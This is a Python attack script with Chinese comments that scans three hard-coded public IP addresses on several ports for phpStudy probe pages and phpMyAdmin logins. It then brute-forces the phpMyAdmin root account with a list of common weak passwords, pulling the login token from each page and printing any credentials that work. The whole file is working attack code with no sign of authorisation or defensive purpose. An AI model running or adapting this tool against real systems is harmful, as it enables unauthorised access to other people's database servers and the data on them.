#!/usr/bin/env python3
"""测新phpStudy目标"""
import urllib.request, http.cookiejar, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

targets = ["120.26.141.181", "150.158.95.91", "39.97.48.37"]

def probe(ip):
    """找探针+phpMyAdmin"""
    result = []
    for port in ["80", "8080", "8980", "9096", "8888", "999"]:
        try:
            req = urllib.request.Request(f"http://{ip}:{port}/", headers={"User-Agent":"Mozilla/5.0"})
            r = urllib.request.urlopen(req, timeout=4, context=ctx)
            body = r.read().decode("utf-8","ignore")
            probe_found = "phpStudy" in body and "探针" in body
            pma_found = "phpMyAdmin" in body or "pma_username" in body
            if probe_found or pma_found:
                result.append(f"port={port} 探针={probe_found} pma={pma_found}")
        except Exception:
            pass
    return result

def try_login(ip, port, path, user, pw):
    try:
        cj = http.cookiejar.CookieJar()
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
        op.addheaders = [("User-Agent","Mozilla/5.0")]
        base = f"http://{ip}:{port}{path}"
        r = op.open(base, timeout=6)
        html = r.read().decode("utf-8","ignore")
        m = re.search(r'name="token" value="([a-f0-9]{32})"', html)
        if not m: return None
        data = f"pma_username={user}&pma_password={pw}&server=1&token={m.group(1)}".encode()
        op.open(urllib.request.Request(f"{base}index.php", data=data), timeout=6).read()
        r = op.open(f"{base}index.php", timeout=6)
        body = r.read().decode("utf-8","ignore")
        if "Cannot log in" in body or "#1045" in body:
            return "FAIL"
        if "logout" in body or "navigation" in body or "server_databases" in body:
            return "SUCCESS"
    except Exception:
        pass
    return None

pwds = ["123456","root","admin","12345678","mysql","root123","password","123456789",
        "admin123","test","phpstudy","phpStudy","12345","1234567","888888","111111",
        "000000","admin888","mysql123","passw0rd","abc123","123123","654321",
        "1234567890","qwerty","p@ssw0rd","P@ssw0rd","admin@123","www123","web123",
        "phpmyadmin","pma","123456a","Aa123456","a123456","zxcvbnm","qazwsx",
        "admin2018","admin2020","admin2024","admin2026","woaini","5201314",
        "root@123","Root123","root123456","MySQL@123","123qwe","asd123456",
        "123456789a","admin8888","88888888","666666","147258369","987654321"]

for ip in targets:
    info = probe(ip)
    print(f"{ip}: {info if info else '无探针/phpMyAdmin'}", flush=True)
    # 对所有发现的phpMyAdmin测弱口令
    for entry in info:
        port = entry.split("=")[1].split(" ")[0]
        if "pma=True" in entry:
            for path in ["/phpmyadmin/", "/phpMyAdmin/"]:
                success = False
                for pw in pwds:
                    r = try_login(ip, port, path, "root", pw)
                    if r == "SUCCESS":
                        print(f"!!! {ip}:{port} root/{pw} 登录成功 ({path})", flush=True)
                        success = True
                        break
                    time.sleep(0.15)
                if success: break
print("DONE")
